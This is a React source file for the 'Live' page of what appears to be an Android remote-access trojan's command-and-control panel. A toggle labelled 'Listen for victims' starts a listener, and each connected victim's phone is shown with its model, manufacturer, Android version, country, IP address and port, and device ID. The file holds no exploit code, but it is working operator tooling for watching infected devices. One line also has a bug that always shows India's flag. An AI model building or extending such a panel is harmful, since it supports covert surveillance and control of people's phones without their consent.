import './Live.scss';

import { InfoLabel, Switch } from '@fluentui/react-components';
import { faAndroid } from '@fortawesome/free-brands-svg-icons';
import { faEye } from '@fortawesome/free-regular-svg-icons';
import {
    faFingerprint,
    faFlag,
    faIndustry,
    faMobileScreen,
    faTowerBroadcast,
    faWifi,
} from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { observer } from 'mobx-react-lite';
import React, { useEffect } from 'react';
import ReactCountryFlag from 'react-country-flag';

import Countries from '../../../assets/countries.json';
import { CustomToolbar, LoadingOverlay } from '../../../components';
import { useStore } from '../../../store';
import {
    ConnectionStatusColorMap,
    ConnectionStatusTextMap,
} from '../../../utils/Mappings';

const nameCountryCodeMap = Countries.reduce<Record<string, string>>(
    (acc, country) => {
        acc[country.Country] = country.ISO_A2;
        return acc;
    },
    {},
);

export const Live: React.FC = observer(() => {
    const { socketStore } = useStore();

    useEffect(() => {
        socketStore.connect();

        return () => {
            socketStore.disconnect();
        };
    }, [socketStore]);

    return (
        <div className='page-container live'>
            <CustomToolbar>
                <Switch
                    label='Listen for victims'
                    labelPosition='before'
                    disabled={socketStore.inprogress}
                    checked={socketStore.listening}
                    onChange={(_, data) => {
                        if (data.checked) {
                            socketStore.startListening();
                        } else {
                            socketStore.stopListening();
                        }
                    }}
                />
                <div className='fill'></div>
                <div className='item'>
                    <FontAwesomeIcon icon={faEye} />
                    <InfoLabel
                        info='This indicates the number of victims that are currently connected to the server.'
                        className='victims-count'
                    >
                        Connected Victims: {socketStore.victims.length}
                    </InfoLabel>
                </div>

                <div className='item'>
                    <FontAwesomeIcon
                        icon={faTowerBroadcast}
                        color={
                            ConnectionStatusColorMap[
                                socketStore.connectionStatus
                            ]
                        }
                    />
                    <InfoLabel
                        info={
                            'This indicates the status of connection between this window and the server. This is not related to the connection of the victims.'
                        }
                    >
                        Live Connection:{' '}
                        {ConnectionStatusTextMap[socketStore.connectionStatus]}
                    </InfoLabel>
                </div>
            </CustomToolbar>
            <div className='table-container'>
                {socketStore.victims.length > 0 ? (
                    <div className='grid-container'>
                        {socketStore.victims.map((victim, index) => (
                            <div
                                key={`victim-${index}`}
                                className='victim-card'
                            >
                                <div className='image-container'>
                                    {victim.country !== undefined &&
                                    nameCountryCodeMap[victim.country] !==
                                        undefined ? (
                                        <ReactCountryFlag
                                            countryCode={
                                                nameCountryCodeMap.India
                                            }
                                            title={victim.country}
                                            style={{
                                                width: '100%',
                                                height: '100%',
                                            }}
                                            svg
                                        />
                                    ) : (
                                        <svg viewBox='0 0 502.857 502.857'>
                                            <path
                                                d='M115.428 155.433v217.664c0 17 10.208 30.336 27.704 30.336h22.84c-.784 0-2.544 5.768-2.544 8.6v61.648c0 16.112 15.448 29.176 32 29.176 16.56 0 32-13.064 32-29.176v-61.648c0-2.832-3.088-8.6-3.848-8.6h55.712c-.76 0-3.864 5.768-3.864 8.6v61.648c0 16.112 15.416 29.176 31.968 29.176 16.592 0 32.032-13.064 32.032-29.176v-61.648c0-2.832-1.752-8.6-2.536-8.6h22.872c17.496 0 27.664-13.336 27.664-30.336V155.433H113.596h1.832zM59.428 158.977c-16.568 0-32 13.072-32 29.176v124.92c0 16.112 15.432 29.176 32 29.176 16.56 0 32-13.064 32-29.176V188.161c0-16.112-15.44-29.184-32-29.184zM320.3 42.057l5.584-8.192 5.592-8.096 12.456-18.2c1.56-2.256.912-5.264-1.384-6.744-2.272-1.512-5.416-.88-6.904 1.36l-19.016 27.704-5.72 8.344c-18.072-6.832-38.208-10.64-59.48-10.64-21.224 0-41.4 3.816-59.472 10.64l-5.688-8.336-5.624-8.184-13.36-19.512c-1.544-2.248-4.648-2.84-6.952-1.36-2.28 1.488-2.912 4.496-1.392 6.744l12.448 18.208 5.592 8.104 5.616 8.168c-42.432 19.24-71.144 57.368-71.144 97.368h279.96c0-40-28.704-78.128-71.112-97.376zm-128.864 58.536c-8.312 0-15.008-6.536-15.008-14.608s6.696-14.576 15.008-14.576c8.288 0 15 6.504 15 14.576s-6.704 14.608-15 14.608zm120 0c-8.304 0-15.016-6.536-15.016-14.608s6.712-14.576 15.016-14.576c8.288 0 15 6.504 15 14.576s-6.712 14.608-15 14.608z'
                                                style={{
                                                    fill: '#57c927',
                                                }}
                                            />
                                            <path
                                                d='M60.852 224.193c-12.472 0-25.424-11.768-33.424-30.432v119.32c0 16.112 15.432 29.176 32 29.176 16.56 0 32-13.064 32-29.176V199.985c-8 14.992-19.568 24.208-30.576 24.208z'
                                                style={{
                                                    fill: '#1cb71c',
                                                }}
                                            />
                                            <path
                                                d='M443.428 158.977c-16.568 0-32 13.072-32 29.176v124.92c0 16.112 15.432 29.176 32 29.176 16.56 0 32-13.064 32-29.176V188.161c0-16.112-15.44-29.184-32-29.184z'
                                                style={{
                                                    fill: '#57c927',
                                                }}
                                            />
                                            <path
                                                d='M444.852 224.193c-12.472 0-25.424-11.768-33.424-30.432v119.32c0 16.112 15.432 29.176 32 29.176 16.56 0 32-13.064 32-29.176V199.985c-8 14.992-19.568 24.208-30.576 24.208zM251.428 179.337c-63.28 0-120-7.32-136-17.712v211.472c0 17 10.208 30.336 27.704 30.336h22.84c-.784 0-2.544 5.768-2.544 8.6v61.648c0 16.112 15.448 29.176 32 29.176 16.56 0 32-13.064 32-29.176v-61.648c0-2.832-3.088-8.6-3.848-8.6h55.712c-.76 0-3.864 5.768-3.864 8.6v61.648c0 16.112 15.416 29.176 31.968 29.176 16.592 0 32.032-13.064 32.032-29.176v-61.648c0-2.832-1.752-8.6-2.536-8.6h22.872c17.496 0 27.664-13.336 27.664-30.336v-211.48c-16 10.392-72.712 17.72-136 17.72zM326.436 85.977c0 8.072-6.712 14.608-15 14.608-8.304 0-15.016-6.536-15.016-14.608 0-4.376 2.008-8.24 5.136-10.912-15.816-2.64-32.64-4.088-50.128-4.088s-34.304 1.448-50.128 4.088c3.136 2.664 5.144 6.536 5.144 10.912 0 8.072-6.712 14.608-15 14.608-8.312 0-15.008-6.536-15.008-14.608 0-2.064.456-4.024 1.248-5.808-23.984 6.304-44.592 15.504-60.144 26.808-3.92 10.296-6.088 24.456-6.088 32.456h279.96c0-8-2.168-22.152-6.08-32.44-15.544-11.32-36.16-20.536-60.128-26.84a14.5 14.5 0 0 1 1.232 5.824z'
                                                style={{
                                                    fill: '#1cb71c',
                                                }}
                                            />
                                            <path
                                                d='M251.428 262.817c-53.896 0-104-10.632-136-28.056v138.336c0 17 10.208 30.336 27.704 30.336h22.84c-.784 0-2.544 5.768-2.544 8.6v61.648c0 16.112 15.448 29.176 32 29.176 16.56 0 32-13.064 32-29.176v-61.648c0-2.832-3.088-8.6-3.848-8.6h55.712c-.76 0-3.864 5.768-3.864 8.6v61.648c0 16.112 15.416 29.176 31.968 29.176 16.592 0 32.032-13.064 32.032-29.176v-61.648c0-2.832-1.752-8.6-2.536-8.6h22.872c17.496 0 27.664-13.336 27.664-30.336V234.761c-32 17.432-82.104 28.056-136 28.056z'
                                                style={{
                                                    fill: '#049e42',
                                                }}
                                            />
                                        </svg>
                                    )}
                                </div>
                                <div className='victim-info'>
                                    <div
                                        className='model'
                                        title={`Model: ${victim.model}`}
                                    >
                                        <FontAwesomeIcon
                                            icon={faMobileScreen}
                                        />
                                        <span>{victim.model}</span>
                                    </div>
                                    <div
                                        className='manufacturer'
                                        title={`Manufacturer: ${victim.manf}`}
                                    >
                                        <FontAwesomeIcon icon={faIndustry} />
                                        <span>{victim.manf}</span>
                                    </div>
                                    <div
                                        className='release'
                                        title={`Android Version: ${victim.release}`}
                                    >
                                        <FontAwesomeIcon icon={faAndroid} />
                                        <span>Android {victim.release}</span>
                                    </div>
                                    <div
                                        className='country'
                                        title={`Country: ${victim.country}`}
                                    >
                                        <FontAwesomeIcon icon={faFlag} />
                                        <span>{victim.country}</span>
                                    </div>
                                    <div
                                        className='ip'
                                        title={`Remote Address: ${victim.ip}:${victim.port}`}
                                    >
                                        <FontAwesomeIcon icon={faWifi} />
                                        <span>
                                            {victim.ip}:{victim.port}
                                        </span>
                                    </div>
                                    <div
                                        className='id'
                                        title={`Device ID: ${victim.deviceId}`}
                                    >
                                        <FontAwesomeIcon icon={faFingerprint} />
                                        <span>{victim.deviceId}</span>
                                    </div>
                                </div>
                            </div>
                        ))}
                    </div>
                ) : (
                    <div className='no-data'>
                        <div className='text'>
                            {!socketStore.listening
                                ? 'Not listening for victims!'
                                : 'No victims connected!'}
                        </div>
                    </div>
                )}
                <LoadingOverlay
                    loading={socketStore.loading || socketStore.inprogress}
                />
            </div>
        </div>
    );
});
